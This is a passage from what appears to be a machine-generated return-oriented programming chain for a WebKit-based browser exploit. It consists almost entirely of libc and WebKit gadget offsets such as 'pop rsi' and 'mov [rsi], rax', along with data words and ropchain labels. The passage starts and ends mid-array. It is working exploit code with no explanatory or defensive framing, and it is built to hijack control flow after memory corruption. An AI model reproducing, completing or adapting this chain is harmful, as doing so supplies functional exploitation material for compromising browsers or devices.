libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1096024, //L1222
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1222:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1096104, //L1224
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1224:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1225:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1226:
db([2, 0]); // 0x2
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1096216, //L1227
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1096232, //L1228
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1227:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1228:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+835093, //sub rax, rcx ; sbb rdx, rcx
libc_base+764760, //pop rsi
ropchain+1096320, //L1230
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1230:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1096376, //L1231
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1231:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1096496, //L1234
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1233:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1234:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1096584, //L1236
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1096600, //L1237
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1236:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1237:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1096744, //L1241
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1096712, //L1239
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1096728, //L1240
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1239:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1240:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1241:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1096816, //L1243
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1243:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1096872, //L1244
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1244:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1096952, //L1246
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1246:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1247:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1248:
db([25, 0]); // 0x19
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1097064, //L1249
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1097080, //L1250
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1249:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1250:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1097168, //L1252
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1252:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1097224, //L1253
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1253:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1097296, //L1256
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1256:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1097352, //L1257
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1257:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
//L1259:
libc_base+756002, //mov [rdi], r8
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1097504, //L1261
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1260:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1261:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1097592, //L1263
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1097608, //L1264
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1263:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1264:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1097752, //L1268
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1097720, //L1266
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1097736, //L1267
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1266:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1267:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1268:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1097824, //L1270
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1270:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1097880, //L1271
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1271:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1097960, //L1273
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1273:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1274:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1275:
db([26, 0]); // 0x1a
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1098072, //L1276
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1098088, //L1277
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1276:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1277:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1098176, //L1279
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1279:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1098232, //L1280
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1280:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1098304, //L1283
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1283:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1098360, //L1284
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1284:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
//L1286:
libc_base+144605, //pop rdi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1098512, //L1288
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1287:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1288:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1098600, //L1290
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1098616, //L1291
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1290:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1291:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1098760, //L1295
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1098728, //L1293
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1098744, //L1294
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1293:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1294:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1295:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1098832, //L1297
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1297:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1098888, //L1298
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1298:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1098968, //L1300
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1300:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1301:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1302:
db([27, 0]); // 0x1b
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1099080, //L1303
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1099096, //L1304
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1303:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1304:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1099184, //L1306
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1306:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1099240, //L1307
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1307:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1099312, //L1310
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1310:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1099368, //L1311
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1311:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1099472, //L1314
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1313:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+763368,); //pop rcx
//L1314:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1099560, //L1316
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1099576, //L1317
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1316:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1317:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1099720, //L1321
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1099688, //L1319
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1099704, //L1320
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1319:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1320:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1321:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1099792, //L1323
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1323:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1099848, //L1324
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1324:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1099928, //L1326
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1326:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1327:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1328:
db([1, 0]); // 0x1
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1100040, //L1329
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1100056, //L1330
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1329:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1330:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+835093, //sub rax, rcx ; sbb rdx, rcx
libc_base+764760, //pop rsi
ropchain+1100144, //L1332
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1332:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1100200, //L1333
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1333:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1100320, //L1336
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1335:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1336:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1100408, //L1338
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1100424, //L1339
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1338:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1339:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1100568, //L1343
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1100536, //L1341
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1100552, //L1342
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1341:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1342:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1343:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1100640, //L1345
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1345:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1100696, //L1346
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1346:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1100776, //L1348
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1348:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1349:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1350:
db([28, 0]); // 0x1c
set_gadgets([
webkit_base+10973692, //imul rax, rcx
libc_base+764760, //pop rsi
ropchain+1100888, //L1351
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+2002592, //mov rax, [rsi]
libc_base+764760, //pop rsi
ropchain+1100904, //L1352
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+763368 //pop rcx
]);
//L1351:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1352:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+755660, //add rax, rcx
libc_base+764760, //pop rsi
ropchain+1100992, //L1354
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1354:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1101048, //L1355
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1355:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1101120, //L1358
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1358:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1101176, //L1359
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1359:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+20307877, //mov [rax], rcx
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+759608, //pop rax
//L1361:
webkit_base+12288695, //mov [rdi], r9
libc_base+764760 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1101328, //L1363
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+731401, //mov rax, r8
libc_base+764760 //pop rsi
]);
//L1362:
db([16, 0]); // 0x10
set_gadget(libc_base+763368,); //pop rcx
//L1363:
db([0, 0]); // 0x0
set_gadgets([
libc_base+501454, //add rax, rsi
libc_base+764760, //pop rsi
ropchain+1101416, //L1365
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1101432, //L1366
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+144605 //pop rdi
]);
//L1365:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1366:
db([0, 0]); // 0x0
set_gadgets([
libc_base+225585, //mov rax, [rdi]
libc_base+764760, //pop rsi
ropchain+1101576, //L1370
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1101544, //L1368
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1101560, //L1369
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+144605 //pop rdi
]);
//L1368:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1369:
db([0, 0]); // 0x0
set_gadget(libc_base+759608,); //pop rax
//L1370:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+764760, //pop rsi
ropchain+1101648, //L1372
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1372:
db([0, 0]); // 0x0
set_gadgets([
libc_base+426295, //mov [rdi], rax
libc_base+764760, //pop rsi
ropchain+1101704, //L1373
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+853989, //mov rax, rcx
libc_base+763368 //pop rcx
]);
//L1373:
db([0, 0]); // 0x0
set_gadget(libc_base+764760,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+853989, //mov rax, rcx
libc_base+764760, //pop rsi
ropchain+1101784, //L1375
webkit_base+660161, //mov [rsi], rax ; mov al, 1
webkit_base+3236123 //pop r9
]);
//L1375:
db([0, 0]); // 0x0
set_gadget(libc_base+763368,); //pop rcx
//L1376:
db([8, 0]); // 0x8
set_gadget(libc_base+759608,); //pop rax
//L1377:
